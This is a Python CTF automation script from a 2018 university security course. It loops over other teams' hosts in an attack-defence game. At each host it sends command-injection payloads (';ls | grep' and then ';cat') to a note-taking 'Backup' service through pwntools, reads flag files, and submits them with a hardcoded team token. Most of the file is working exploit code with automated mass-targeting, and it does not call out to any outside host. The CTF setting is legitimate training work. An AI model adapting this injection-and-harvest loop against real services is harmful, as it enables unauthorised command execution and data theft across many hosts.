#!/usr/bin/python

##
##	CSE 545 - Spring 2018
##	Team 9: Black Shadow (blackshadow@asu.edu)
##

#from swpag_client import Team
from api import *
import sys
import os
import time
import socks # pip install PySocks
import socket

# import PWN TOOLS LOGS and set logging.
os.environ["PWNLIB_SILENT"] = "1"
from pwn import *



'''------------------------------------------------------------------------------------------------------------------
 ' Automated tool to perform exploit to grab and submit flags for final - Project CTF
 '
 ' Group:	Black Shadow
 ' Team:	9
 ' Class: 	Spring 2018 CSE 545
 ' Professor:	Adam Doupe
 ' Date:	4/30/18
 '
 ' 
 ' Description: This application will take the exploit and try to run on every other host. Note: This is only
 '		a skeleton and there is currently no exploit written. Try to find exploit live during CTF.
 '		This application uses api.py and swpag_client libraries.
 '
 '
-----------------------------------------------------------------------------------------------------------------'''

# Configure port scanner. ##########################################################################################

# Run locally on home machine (requires connection through proxy) = 1
# Run from remote machine = 0
RUN_LOCAL = 1

# This is your team's token
#TEAM_TOKEN = "04gwUvwtpPZzbzMMyaYGwMkTW3eBx34N"
TEAM_TOKEN = "cn3XA01z3oa8nBBHsUFXtYT01zBXJIk3"

# This may change between CTFs
#GAME_IP = "http://18.219.145.160/"
GAME_IP = "54.241.70.152"

# This is the list of infected hosts
INFECTED_HOSTS = ["team1" "team2", "team3", "team4", "team5", "team6", "team7", "team8", "team10", "team11",
		"team12", "team13", "team14", "team15", "team16", "team17", "team18", "team19", "team20", "team21"]

# Note the Host name and IP mapping might change during CTF
HOSTS_IP = {"team1":"172.31.129.1", "team2":"172.31.129.2", "team3":"172.31.129.3", "team4":"172.31.129.4", 
		  "team5":"172.31.129.5", "team6":"172.31.129.6", "team7":"172.31.129.7", "team8":"172.31.129.8",
		  "team9":"172.31.129.9", "team10":"172.31.129.10", "team11":"172.31.129.11", "team12":"172.31.129.12",
		  "team13":"172.31.129.13", "team14":"172.31.129.14", "team15":"172.31.129.15", "team16":"172.31.129.16",
		  "team17":"172.31.129.17", "team18":"172.31.129.18", "team19":"172.31.129.19", "team20":"172.31.129.20",
		  "team21":"172.31.129.21"}

# This is the time per tick in seconds.
TICK_TIME = 180

# This is the service that the backdoor exploited. Note: The service that was the entry point is the only
#  flags visible to the backdoor, since it is running under that user.
EXPLOIT_SERVICE_ID = 10002

# Backdoor port. When backdoor is launched port is specified.
BACKDOOR_PORT = 29999

# Path to flags!
FLAG_PATH = "/opt/ctf/backup/append/"

# keys for target
HOST = "hostname"
PORT = "port"
FLAG_ID = "flag_id"
TEAM_NAME = "team_name"

# Print debug statements
DEBUG=0

####################################################################################################################

# Prints if in debug mode
def debug(msg):
	if (DEBUG):
		print msg

# This is a dummy exploit, it worked on Backup during the practice PCTF
def exploitTarget(target):
	host = target[HOST]
	port = target[PORT]
	flagId = target[FLAG_ID]

	if (RUN_LOCAL):
		host = HOSTS_IP[host]

	flag = ""
	try:
		# Connect to victim machine using PWNTools.
		conn = remote(host, port)
		text_recvd = conn.recv(timeout = 0.3)
		debug(text_recvd)

		# Send initial input '2' to receive note.  
		conn.send("2" + "\n")
		text_recvd = conn.recv(timeout = 0.3);
		debug(text_recvd)

		# Enter dummy name and pass for file to receive.
		exploitPayload = "hello" + '\n'
		conn.send(exploitPayload)
		text_recvd = conn.recv(timeout = 0.3);
		debug(text_recvd)

		# This is the exploit payload. Runs ls command.
		exploitPayload = "bb" + ';ls | grep ' + flagId + ';' + '\n'
		debug("Payload: " + exploitPayload)
		conn.send(exploitPayload)

		# Print incoming buffer.
		text_recvd = conn.recv(timeout = 0.3)
		debug(text_recvd)
		text_recvd = conn.recv(timeout = 0.3)
		debug(text_recvd)

		# This is the filename of 'current' flag!
		lines = text_recvd.splitlines()
		debug("Lines: " + str(lines) + "\n:End lines")
		currFlag = ""
		if len(lines) > 1:
			currFlag = lines[0].strip()

		debug("Flag file: " + currFlag)

		# Now repeat! We now know flag filename, instead of ls lets cat.
		# Send initial input '2' to receive note.  
		conn.send("2" + "\n")
		text_recvd = conn.recv(timeout = 0.3);
		debug(text_recvd)

		# Enter dummy name and pass for file to receive.
		exploitPayload = "hello_again" + '\n'
		conn.send(exploitPayload)
		text_recvd = conn.recv(timeout = 0.3);
		debug(text_recvd)

		# This is the exploit payload. Runs ls command.
		exploitPayload = "bbb" + ';cat ' + currFlag + ';' + '\n'
		debug("Payload: " + exploitPayload)
		conn.send(exploitPayload)

		# Print incoming buffer.
		text_recvd = conn.recv(timeout = 0.3)
		debug(text_recvd)

		# This is the filename of 'current' flag!
		text_recvd = conn.recv(timeout = 0.3)
		debug(text_recvd)
		splitStr = text_recvd.split('Hello')
		flag = ""
		if len(splitStr) > 1:
			flag = splitStr[0].strip()
			if (flag != ""):
				print ("Flag!: " + flag)

		text_recvd = conn.recv(timeout = 0.3)
		debug(text_recvd)
		conn.close()

	except:
		flag = ""

	if (flag == ""):	
		print ("Didn't work on: " + target[HOST] + ", " + host)

	print ("")

	return flag


def main():
	if TEAM_TOKEN == "":
		raise RuntimeError("You need to specify your team token.")

	# Initialize API wrapper
	api = ProjectCTFAPI(GAME_IP, TEAM_TOKEN)
	
	# Remove this line once you know what you're doing
	api.debug = False 
	
	# Get all services in the game
	serviceIds = api.getServices()

	# Grab all targets
	targets = api.getTargets(EXPLOIT_SERVICE_ID)

	print("~" * 5 + " Exploit search for service %s " % EXPLOIT_SERVICE_ID + "~" * 5)
	
	# List of targets of interest that match infected targets in INFECTED_HOSTS
	infectedTargets = []
	
	# Get only targets of interest.
	for target in targets:
		if (target[HOST] in INFECTED_HOSTS):
			infectedTargets.append(target)
	
	flags = []
	for target in infectedTargets:
		print "Attempting to run exploit on: " + target[HOST]
		flag = exploitTarget(target)
		if (flag != ""):
			flags.append(flag)
	
	print ("Flags: " + str(flags))
	api.debug = True		
	api.submitFlag(flags)
	api.debug = False

if __name__ == "__main__":	
	

	if (RUN_LOCAL):
		socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, '127.0.0.1',4444)
		socket.socket = socks.socksocket

	while True:
		main()
		print ("Sleeping till next tick to re-run.")
		time.sleep(TICK_TIME)

<!--stackedit_data:
eyJoaXN0b3J5IjpbNjg1MDg0ODQzXX0=
-->
